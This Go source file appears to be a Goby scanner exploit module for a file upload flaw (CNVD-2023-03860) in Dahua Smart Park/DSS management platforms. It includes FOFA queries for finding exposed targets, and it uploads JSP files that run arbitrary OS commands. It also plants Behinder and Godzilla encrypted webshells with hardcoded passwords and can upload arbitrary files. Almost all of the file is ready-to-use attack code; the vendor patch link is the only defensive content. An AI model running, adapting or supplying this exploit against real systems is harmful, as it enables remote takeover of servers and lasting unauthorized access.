package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Dahua DSS source/publishing/publishing/material/file/video File Upload Vulnerability",
    "Description": "<p>Dahua smart park solutions focus on multiple business areas such as operation management, comprehensive security, convenient traffic, and collaborative office. Relying on AI, Internet of Things, and big data technologies, the digital upgrade of park management can be realized to improve security levels, work efficiency, and management. Cost reduction.</p><p>There is a file upload vulnerability in the system /publishing/ of Dahua Smart Park. Attackers can use this vulnerability to obtain server permissions by uploading specific configuration files.</p>",
    "Product": "dahua-Smart-Park-GMP",
    "Homepage": "https://www.dahuatech.com/product/info/5609.html",
    "DisclosureDate": "2023-02-22",
    "Author": "715827922@qq.com",
    "FofaQuery": "body=\"/WPMS/asset/lib/json2.js\" || body=\"src=\\\"/WPMS/asset/common/js/jsencrypt.min.js\\\"\" || (cert=\"Dahua\" && cert=\"DSS\") || header=\"Path=/WPMS\" || banner=\"Path=/WPMS\"",
    "GobyQuery": "body=\"/WPMS/asset/lib/json2.js\" || body=\"src=\\\"/WPMS/asset/common/js/jsencrypt.min.js\\\"\" || (cert=\"Dahua\" && cert=\"DSS\") || header=\"Path=/WPMS\" || banner=\"Path=/WPMS\"",
    "Level": "3",
    "Impact": "<p>There is a file upload vulnerability in the system /publishing/ of Dahua Smart Park. Attackers can use this vulnerability to obtain server permissions by uploading specific configuration files.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.dahuatech.com/cases/info/76.html\">https://www.dahuatech.com/cases/info/76.html</a></p>",
    "References": [
        "https://www.cnvd.org.cn/flaw/show/CNVD-2023-03860"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,cmd,custom",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla",
            "show": "attackType=webshell"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "test.txt",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "test",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/publishing/publishing/material/file/video",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=dd8f988919484abab3816881c55272a7"
                },
                "data_type": "text",
                "data": "--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"troZD.jsp\"\r\n\r\n<%@ page contentType=\"text/html; charset=GBK\"%><%@page import=\"java.math.BigInteger\"%><%@page import=\"java.security.MessageDigest\"%><% MessageDigest md5 = null;md5 = MessageDigest.getInstance(\"MD5\");String s = \"123456\";String miyao = \"\";String jiamichuan = s + miyao;md5.update(jiamichuan.getBytes());String md5String = new BigInteger(1, md5.digest()).toString(16);out.println(md5String);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name=\"poc\"\r\n\r\npoc\r\n--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name=\"Submit\"\r\n\r\nsubmit\r\n--dd8f988919484abab3816881c55272a7--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"success\":true",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "VIDEO/",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "path1|lastbody|regex|\"path\"\\s*:\\s*\"([^\"]+)\""
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/publishingImg/{{{path1}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e10adc3949ba59abbe56e057f20f883e",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/publishing/publishing/material/file/video",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=dd8f988919484abab3816881c55272a7"
                },
                "data_type": "text",
                "data": "--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"troZD.jsp\"\r\n\r\n<%@ page contentType=\"text/html; charset=UTF-8\" import=\"java.io.*\" %>\r\n<% String cmd = request.getParameter(\"cmd\");if(cmd==null||cmd.equals(\"\")) cmd=\"whoami\";try {String name= System.getProperty(\"os.name\");String[] cmds =name!=null&&name.toLowerCase().contains(\"win\") ? new String[]{\"cmd.exe\", \"/c\",  cmd}:new String[]{\"sh\", \"-c\", cmd};InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();byte[] buf=new byte[1024];int len=0;ByteArrayOutputStream bout=new ByteArrayOutputStream();while ((len=in.read(buf))!=-1){bout.write(buf,0,len);}response.getWriter().write(new String(bout.toByteArray()));}catch(IOException e) {e.printStackTrace();}out.print(\"|TestFor9527|\");;new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name=\"poc\"\r\n\r\npoc\r\n--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name=\"Submit\"\r\n\r\nsubmit\r\n--dd8f988919484abab3816881c55272a7--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"success\":true",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "VIDEO/",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "path2|lastbody|regex|\"path\"\\s*:\\s*\"([^\"]+)\""
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/publishingImg/{{{path2}}}?cmd={{{cmd}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "|TestFor9527|",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(.*)"
            ]
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        "CNVD-2023-03860"
    ],
    "CVSSScore": "10",
    "Translation": {
        "CN": {
            "Name": "大华智慧园区综合管理平台 source/publishing/publishing/material/file/video 文件上传漏洞",
            "Product": "dahua-智慧园区综合管理平台",
            "Description": "<p>大华智慧园区解决方案围绕运营管理、综合安防、便捷通行、协同办公等多个业务领域展开，依托AI、物联网、大数据技术实现园区管理数字化升级，实现安全等级提升、工作效率提升、管理成本下降。</p><p>大华智慧园区系统 /publishing/ 存在文件上传漏洞，攻击者可以通过上传特定构造文件，利用该漏洞获取服务器权限。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.dahuatech.com/cases/info/76.html\" target=\"_blank\">https://www.dahuatech.com/cases/info/76.html</a><br></p>",
            "Impact": "<p>浙江大华技术股份有限公司智慧园区综合管理平台存在文件上传漏洞，攻击者可以通过上传特定构造文件，利用该漏洞获取服务器权限。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Dahua DSS source/publishing/publishing/material/file/video File Upload Vulnerability",
            "Product": "dahua-Smart-Park-GMP",
            "Description": "<p>Dahua smart park solutions focus on multiple business areas such as operation management, comprehensive security, convenient traffic, and collaborative office. Relying on AI, Internet of Things, and big data technologies, the digital upgrade of park management can be realized to improve security levels, work efficiency, and management. Cost reduction.</p><p>There is a file upload vulnerability in the system /publishing/ of Dahua Smart Park. Attackers can use this vulnerability to obtain server permissions by uploading specific configuration files.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.dahuatech.com/cases/info/76.html\" target=\"_blank\">https://www.dahuatech.com/cases/info/76.html</a><br></p>",
            "Impact": "<p>There is a file upload vulnerability in the system /publishing/ of Dahua Smart Park. Attackers can use this vulnerability to obtain server permissions by uploading specific configuration files.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-07-27",
    "PocId": "10809"
}`

	sendShell8278 := func(hostInfo *httpclient.FixUrl, filename, content, cmd, attackType string) (*httpclient.HttpResponse, error) {
		var path string
		var getRequestConfig *httpclient.RequestConfig
		postRequestConfig := httpclient.NewPostRequestConfig("/publishing/publishing/material/file/video")
		postRequestConfig.VerifyTls = false
		if len(cmd) > 0 {
			postRequestConfig.FollowRedirect = true
		} else {
			postRequestConfig.FollowRedirect = false
		}
		postRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=dd8f988919484abab3816881c55272a7")

		if attackType == "poc" {
			//poc部分文件内容
			postRequestConfig.Data = fmt.Sprintf("--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"%s.jsp\"\r\n\r\n<%%@page contentType=\"text/html; charset=GBK\"%%><%%@page import=\"java.math.BigInteger\"%%><%%@page import=\"java.security.MessageDigest\"%%><%% MessageDigest md5 = null;md5 = MessageDigest.getInstance(\"MD5\");String s = \"123456\";String miyao = \"\";String jiamichuan = s + miyao;md5.update(jiamichuan.getBytes());String md5String = new BigInteger(1, md5.digest()).toString(16);out.println(md5String);new java.io.File(application.getRealPath(request.getServletPath())).delete();%%>\r\n--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name=\"poc\"\r\n\r\npoc\r\n--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name=\"Submit\"\r\n\r\nsubmit\r\n--dd8f988919484abab3816881c55272a7--", filename)
		} else if attackType == "cmd" {
			//命令执行部分文件内容
			postRequestConfig.Data = fmt.Sprintf("--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"%s.jsp\"\r\n\r\n<%%@page contentType=\"text/html; charset=UTF-8\" import=\"java.io.*\" %%>\n<%% String cmd = request.getParameter(\"cmd\");if(cmd==null||cmd.equals(\"\")) cmd=\"whoami\";try {String name= System.getProperty(\"os.name\");String[] cmds =name!=null&&name.toLowerCase().contains(\"win\") ? new String[]{\"cmd.exe\", \"/c\",  cmd}:new String[]{\"sh\", \"-c\", cmd};InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();byte[] buf=new byte[1024];int len=0;ByteArrayOutputStream bout=new ByteArrayOutputStream();while ((len=in.read(buf))!=-1){bout.write(buf,0,len);}response.getWriter().write(new String(bout.toByteArray()));}catch(IOException e) {e.printStackTrace();};%%>\r\n--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name=\"poc\"\r\n\r\npoc\r\n--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name=\"Submit\"\r\n\r\nsubmit\r\n--dd8f988919484abab3816881c55272a7--", filename)
		} else if attackType == "webshell" {
			//哥斯拉，冰蝎部分文件内容
			postRequestConfig.Data = fmt.Sprintf("--dd8f988919484abab3816881c55272a7\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"%s.jsp\"\r\n\r\n%s\r\n--dd8f988919484abab3816881c55272a7--\r\n", filename, content)
		} else if attackType == "custom" {
			//自定义部分文件内容
			postRequestConfig.Data = fmt.Sprintf("--dd8f988919484abab3816881c55272a7\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"%s\"\r\n\r\n%s\r\n--dd8f988919484abab3816881c55272a7--\r\n", filename, content)
		}
		//获取path
		response, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err != nil {
			return nil, err
		}
		if response.StatusCode == 200 && strings.Contains(response.Utf8Html, "success") {
			reg := regexp.MustCompile(`"path"\s*:\s*"([^"]+)"`)
			match := reg.FindStringSubmatch(response.Utf8Html)
			path = match[1]
		}
		//传入cmd参数，进行执行
		if cmd == "" {
			getRequestConfig = httpclient.NewGetRequestConfig("/publishingImg/" + path)
		} else if len(cmd) > 0 {
			getRequestConfig = httpclient.NewGetRequestConfig("/publishingImg/" + path + "?cmd=" + cmd)
		}
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = true
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)

	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			rsp, err := sendShell8278(hostInfo, goutils.RandomHexString(16), "", "", "poc")
			if err != nil {
				return false
			}
			return rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, "e10adc3949ba59abbe56e057f20f883e")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			content := ""
			filename := ""
			webshell := goutils.B2S(ss.Params["webshell"])
			if attackType == "webshell" {
				filename = goutils.RandomHexString(16)
				if webshell == "behinder" {
					// /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>`
				}
				rsp, err := sendShell8278(expResult.HostInfo, filename, content, "", "webshell")
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				if rsp.StatusCode != 200 && rsp.StatusCode != 500 {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
					return expResult
				}
				expResult.Success = true
				expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + rsp.Request.URL.Path + "\n"
				if attackType != "custom" && webshell == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				} else if attackType != "custom" && webshell == "godzilla" {
					expResult.Output += "Pass: pass 加密器：JAVA_AES_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				}
				expResult.Output += "Webshell type: jsp"
			} else if attackType == "cmd" {
				cmd := goutils.B2S(ss.Params["cmd"])
				rsp2, err := sendShell8278(expResult.HostInfo, filename, "", cmd, "cmd")
				if err != nil {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
					return expResult
				}
				if rsp2.StatusCode != 200 && rsp2.StatusCode != 500 {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
					return expResult
				}
				expResult.Success = true
				expResult.Output = rsp2.Utf8Html
			} else if attackType == "custom" {
				filename = goutils.B2S(ss.Params["filename"])
				content = goutils.B2S(ss.Params["content"])
				rsp3, err := sendShell8278(expResult.HostInfo, filename, content, "", "custom")
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				if rsp3.StatusCode != 200 && rsp3.StatusCode != 500 {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
					return expResult
				}
				expResult.Success = true
				expResult.Output = "漏洞利用成功\n"
				expResult.Output += "URL: " + expResult.HostInfo.FixedHostInfo + rsp3.Request.URL.Path + "\n"
			}
			return expResult
		},
	))
}
